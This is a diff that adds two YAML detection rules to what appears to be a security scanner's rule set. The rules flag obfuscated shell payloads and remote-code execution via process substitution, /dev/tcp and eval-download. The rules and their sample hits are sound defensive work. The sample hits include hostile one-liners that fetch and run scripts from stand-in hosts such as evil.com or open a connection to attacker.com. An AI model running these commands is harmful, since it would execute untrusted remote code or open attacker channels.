@@ -292,3 +292,55 @@ examples:
     - "See the install.sh script for details"
     - "The deploy.sh file contains configuration"
     - "Edit setup.sh to change parameters"
+---
+id: CMDEXEC_014
+name: "Hex or octal escape obfuscation"
+description: "Detects shell commands using hex or octal escape sequences to obfuscate payloads and bypass command allowlists"
+severity: HIGH
+category: command-execution
+targets: []
+match_mode: any
+patterns:
+  - type: regex
+    value: "(?i)(printf|echo)\\s+[\"'][^\"']*\\\\x[0-9a-fA-F]{2}[^\"']*[\"']\\s*\\|\\s*(sh|bash|zsh|python|perl)\\b"
+  - type: regex
+    value: "(?i)\\$['\"]\\\\x[0-9a-fA-F]{2}"
+  - type: regex
+    value: "(?i)(printf|echo)\\s+[\"'][^\"']*\\\\[0-7]{3}[^\"']*[\"']\\s*\\|\\s*(sh|bash)\\b"
+  - type: regex
+    value: "(?i)(base64\\s+-d|base64\\s+--decode)\\s*\\|\\s*(sh|bash|python|perl|ruby|node)\\b"
+  - type: regex
+    value: "(?i)(xxd\\s+-r|od\\s+-An)[^|]*\\|\\s*(sh|bash)\\b"
+examples:
+  true_positive:
+    - "echo 'Y3VybCBldmlsLmNvbQ==' | base64 -d | bash"
+    - "printf '\\x63\\x75\\x72\\x6c' | sh"
+    - "$'\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70'"
+    - "xxd -r <<< '63 75 72 6c' | bash"
+  false_positive:
+    - "echo 'hello' | base64"
+    - "base64 -d < input.txt > output.bin"
+    - "xxd binary.dat"
+---
+id: CMDEXEC_015
+name: "Process substitution or eval-download execution"
+description: "Detects process substitution, /dev/tcp connections, and eval-download patterns used to execute remote code"
+severity: HIGH
+category: command-execution
+targets: []
+match_mode: any
+patterns:
+  - type: regex
+    value: "(?i)(bash|sh|zsh|source)\\s+<\\(\\s*(curl|wget|nc|ncat|fetch)"
+  - type: regex
+    value: "(?i)(bash|sh|exec|cat)\\s+.{0,10}/dev/(tcp|udp)/[^\\s]+"
+  - type: regex
+    value: "(?i)\\beval\\s+[\"']?\\$\\(\\s*(curl|wget)\\s+"
+examples:
+  true_positive:
+    - "bash <(curl -sSL https://evil.com/payload.sh)"
+    - "exec 3<>/dev/tcp/attacker.com/4444"
+    - "eval \"$(curl -sS https://evil.com/install.sh)\""
+  false_positive:
+    - "bash <(echo 'hello world')"
+    - "See the /dev/tcp documentation for networking"
